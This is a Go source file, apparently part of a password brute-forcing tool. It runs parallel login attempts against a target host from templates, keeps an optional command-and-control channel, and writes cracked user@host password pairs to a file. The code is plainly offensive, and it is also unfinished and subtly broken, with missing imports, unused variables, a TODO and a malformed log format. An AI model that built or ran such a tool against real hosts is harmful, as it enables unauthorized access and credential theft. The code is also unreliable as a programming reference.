/* Hostmasters are in charge of brute-forcing a particular host.  They queue
up attempts with taskmaster. */
package main

import (
	"container/list"
	"fmt"
	"log"
)

/* Start a series of attacks on addr. */
func hostmaster(addr string, templates []Template, cmd chan string) {
	defer WG.Done()
	nRunning := 0              /* Number of active attempts */
	nMax := *gc.Htask          /* Mx number of simultanous attempts */
	var c2 chan string         /* C2 Channel, nil if !*gc.Cport */
	var doneChan chan *Attempt /* Channel for finished attempts */
	var a *Attempt             /* Attempt we're trying to start */

	/* Turn the slice of templates into a list of templates */
	tlist := list.New()
	for _, t := range templates {
		tlist.PushBack(t)
	}

	/* Make a C2 channel if necessary */
	if *gc.Cport != "" {
		c2 = make(chan string)
		/* Try with our target as the channel name */
		cname := addr
		s := 0 /* In case addr is taken */
		if !C2CHANS.PutUnique(addr, c2) {
			/* Try with different numbers */
			for !C2CHANS.PutUnique(addr+fmt.Sprintf("%v", s),
				c2) {
				s++
			}
		}
		/* Remove the channel when we're done */
		defer C2CHANS.Delete(cname)
	}

	/* Channel on which to receive finished attempts */
	doneChan = make(chan *Attempt)

	/* Tell the user we're starting */
	log.Printf("Starting up to %v attacks in parallel against %v",
		*gc.Htask, addr)

	/* Main loop */
	for {
		/* Send channel */
		var sc chan *Attempt
		/* Make a new attempt if we're under the limit and don't have
		   one already */
		if nil == a && (nMax <= 0 || nRunning < nMax) {
			/* Next template */
			f := tlist.Front()
			/* Don't bother if we're out of templates */
			if f != nil {
				a = f.Value.(Template).Attempt(doneChan,
					addr)
				tlist.Remove(tlist.Front())
			}
		}
		/* Work out whether to try to send or not */
		if a != nil {
			sc = TMNEW
		}
		select {
		case sc <- a:
			/* Sent an attempt to be attempted */
			nRunning++
			a = nil
		case c := <-c2:
			/* Got a command */
			log.Printf("Hostmaster %v command received: %v", addr,
				c) /* DEBUG */
		case a := <-doneChan:
			nRunning--
			log.Printf("Got finished attempt: %#v (%v)", a, a.Err) /* DEBUG */
			s, f, r := handleFinished(a)

			/* TODO: Handle finished attempt */
		}
		/* Give up if we're done */
		if 0 == tlist.Len() && 0 == nRunning {
			break
		}
	}
	log.Printf("%v Done", addr)
}

/* Handle a finished attempt */
func handleFinished(a *Attempt) (success, fail, retry bool) {
	/* If we have a success */
	if a.Err == nil {
		/* Write it to a file */
		go logSuccess(a)
		return true, false, false
	}
	/* Switch on the type of error */
	switch e := a.Err.(type) {
	default:
		log.Printf("UNHANDLED ERROR (%T): %v", e, e)
		return false, true, false
	}

}

/* Log success appropriately */
func logSuccess(a *Attempt) {
	/* Print message to log */
	log.Printf("[%i] SUCCESS %v@%v - %v", a.Config.User, a.Host, a.Pass)
	/* Write message to file, if flagged */
	if "" == *gc.Sfile {
		return
	}
	/* Try to open the successes file */
	f, err := os.OpenFile(*gc.Sfile, os.O_WRONLY|os.O_APPEND|os.O_CREATE,
		0644)
	/* Close on return */
	defer f.Close()
	/* Give up if we can't */
	if err != nil {
		log.Printf("Unable to open successes file %v: %v", *gc.Sfile,
			err)
		return
	}
	/* Acquire an exclusive lock */
	if syscall.Flock(f.Fd(), syscall.LOCK_EX) != nil {
		log.Printf("Unable to lock %v: %v", *gc.Sfile, err)
		return
	}
	/* Release it when we're done */
	defer syscall.Flock(f.Fd(), syscall.LOCK_UN)
	/* Write line to file */
	s := fmt.Sprintf("%v@%v %v", a.Config.User, a.Host, a.Pass)
	r, err := f.WriteString(s)
	if err != nil {
		log.Printf("Error writing %\"%v\" to %v: %v", s, *gc.Sfile,
			err)
	}
	if r < len(s) {
		log.Printf("Only wrote %v/%v bytes of \"%v\" to %v", r, len(s),
			s, *gc.Sfile)
	}
}
